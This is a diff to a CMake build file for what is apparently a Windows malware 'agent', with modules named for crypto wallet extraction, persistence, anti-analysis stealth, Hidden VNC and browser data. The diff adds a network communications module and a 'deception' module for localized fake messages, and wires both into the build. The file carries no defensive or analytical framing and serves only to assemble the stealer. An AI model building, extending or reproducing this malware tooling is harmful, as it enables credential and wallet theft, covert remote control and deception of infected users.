@@ -61,6 +61,16 @@ set(HVNC_SOURCES
     src/hvnc/hvnc_manager.cpp
 )
 
+# Network secure communications sources
+set(NETWORK_SOURCES
+    src/network/secure_comms.cpp
+)
+
+# LocalizedDeception sources
+set(DECEPTION_SOURCES
+    src/deception/localized_messages.cpp
+)
+
 # All module sources
 set(MODULE_SOURCES 
     ${BROWSER_SOURCES}
@@ -68,6 +78,8 @@ set(MODULE_SOURCES
     ${PERSISTENCE_SOURCES}
     ${STEALTH_SOURCES}
     ${HVNC_SOURCES}
+    ${NETWORK_SOURCES}
+    ${DECEPTION_SOURCES}
 )
 
 # Build options
@@ -77,6 +89,8 @@ option(ENABLE_CRYPTO_MODULE "Enable crypto wallet extraction" ON)
 option(ENABLE_PERSISTENCE_MODULE "Enable persistence mechanisms" ON)
 option(ENABLE_STEALTH_MODULE "Enable anti-analysis features" ON)
 option(ENABLE_HVNC_MODULE "Enable Hidden VNC" ON)
+option(ENABLE_NETWORK_MODULE "Enable secure network communications" ON)
+option(ENABLE_DECEPTION_MODULE "Enable localized fake messages" ON)
 option(ENABLE_ADVANCED_LOGGING "Enable advanced encrypted logging" ON)
 
 # Configure modules based on options
@@ -102,6 +116,14 @@ if(ENABLE_HVNC_MODULE)
     list(APPEND ACTIVE_SOURCES ${HVNC_SOURCES})
 endif()
 
+if(ENABLE_NETWORK_MODULE)
+    list(APPEND ACTIVE_SOURCES ${NETWORK_SOURCES})
+endif()
+
+if(ENABLE_DECEPTION_MODULE)
+    list(APPEND ACTIVE_SOURCES ${DECEPTION_SOURCES})
+endif()
+
 if(BUILD_AS_EXE)
     add_executable(${AGENT_NAME} ${ACTIVE_SOURCES})
     target_compile_definitions(${AGENT_NAME} PRIVATE BUILD_AS_EXE)
@@ -118,6 +140,8 @@ target_include_directories(${AGENT_NAME} PRIVATE
     ${CMAKE_CURRENT_SOURCE_DIR}/src/persistence
     ${CMAKE_CURRENT_SOURCE_DIR}/src/stealth
     ${CMAKE_CURRENT_SOURCE_DIR}/src/hvnc
+    ${CMAKE_CURRENT_SOURCE_DIR}/src/network
+    ${CMAKE_CURRENT_SOURCE_DIR}/src/deception
     ${CMAKE_CURRENT_SOURCE_DIR}/src/logger
 )
 
@@ -140,6 +164,14 @@ endif()
 
 if(ENABLE_HVNC_MODULE)
     target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_HVNC_ENABLED)
+endif()
+
+if(ENABLE_NETWORK_MODULE)
+    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_NETWORK_ENABLED)
+endif()
+
+if(ENABLE_DECEPTION_MODULE)
+    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_DECEPTION_ENABLED)
 endif()
 
 if(ENABLE_ADVANCED_LOGGING)
@@ -177,6 +209,11 @@ if(WIN32)
         # Cryptography libraries
         crypt32
         bcrypt
+        
+        # OpenSSL libraries (for secure communications)
+        # Note: These need to be available on the system
+        # ssl
+        # crypto
         
         # Network libraries
         ws2_32
@@ -316,6 +353,8 @@ add_custom_command(TARGET ${AGENT_NAME} POST_BUILD
     COMMAND ${CMAKE_COMMAND} -E echo "  Persistence Module: ${ENABLE_PERSISTENCE_MODULE}"
     COMMAND ${CMAKE_COMMAND} -E echo "  Stealth Module: ${ENABLE_STEALTH_MODULE}"
     COMMAND ${CMAKE_COMMAND} -E echo "  HVNC Module: ${ENABLE_HVNC_MODULE}"
+    COMMAND ${CMAKE_COMMAND} -E echo "  Network Module: ${ENABLE_NETWORK_MODULE}"
+    COMMAND ${CMAKE_COMMAND} -E echo "  Deception Module: ${ENABLE_DECEPTION_MODULE}"
     COMMAND ${CMAKE_COMMAND} -E echo "  Advanced Logging: ${ENABLE_ADVANCED_LOGGING}"
     COMMAND ${CMAKE_COMMAND} -E echo "Agent size before packing:"
     COMMAND ${CMAKE_COMMAND} -E echo "Agent binary: $<TARGET_FILE:${AGENT_NAME}>"
